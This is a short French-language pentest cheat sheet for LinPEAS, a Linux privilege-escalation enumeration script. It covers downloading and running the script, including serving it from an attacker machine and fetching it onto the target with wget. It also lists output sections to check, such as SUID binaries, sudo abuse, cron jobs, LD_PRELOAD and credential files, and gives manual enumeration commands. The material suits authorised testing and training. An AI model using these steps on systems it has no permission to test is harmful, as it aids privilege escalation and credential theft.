# LinPEAS  – Post-Exploitation & Privilege Escalation (Linux)

LinPEAS est un script d’automatisation destiné à identifier les vecteurs potentiels d'escalade de privilèges sur les systèmes Linux. Il fait partie de la suite PEASS-ng.

# la cheat sheet est nulle je dois la modifier 

---

##  1. Téléchargement et Exécution

### Depuis une machine avec accès internet :
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Depuis un serveur local (si la machine cible n’a pas accès à internet) :
```bash
# Sur l'attaquant :
python3 -m http.server 8000

# Sur la cible :
wget http://<ip_attaquant>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

##  2. Lecture et Analyse des Résultats

LinPEAS génère un grand volume d'information. Voici les sections critiques à analyser :

### ➤ SUID / SGID / Capabilities
- Fichiers avec SUID/SGID pouvant permettre un accès root
- Fichiers avec des capacités POSIX spéciales (ex: `cap_setuid`, `cap_dac_read_search`)

### ➤ Binary Exploitation
- Fichiers SUID avec des droits d'exécution inhabituel
- Binaries custom en `/home`, `/opt`, `/usr/local/bin`

### ➤ Cron Jobs
- Tâches planifiées en tant que root avec des scripts modifiables
- Tâches pointant vers des chemins inexistants

### ➤ Accès `sudo`
- Commandes accessibles via `sudo` sans mot de passe
- Possibilités d'abus (`sudo vi`, `sudo less`, `sudo python`, etc.)

### ➤ Variables d’environnement
- PATH modifiable ou contenant des chemins insécures
- Variables LD_PRELOAD, LD_LIBRARY_PATH exploitables

### ➤ Services & Logiciels
- Services en cours d’exécution avec des permissions élevées
- Versions vulnérables détectées (MySQL, Apache, etc.)

### ➤ Fichiers sensibles
- Fichiers contenant potentiellement des credentials (`.bash_history`, `wp-config.php`, etc.)
- Clés SSH privées accessibles ou autorisées

---

## ⚙️ 3. Commandes utiles pour compléter LinPEAS

### Rechercher manuellement les SUID :
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Vérifier les accès `sudo` :
```bash
sudo -l
```

### Vérifier les cron jobs globaux :
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

### Scanner les capacités :
```bash
getcap -r / 2>/dev/null
```

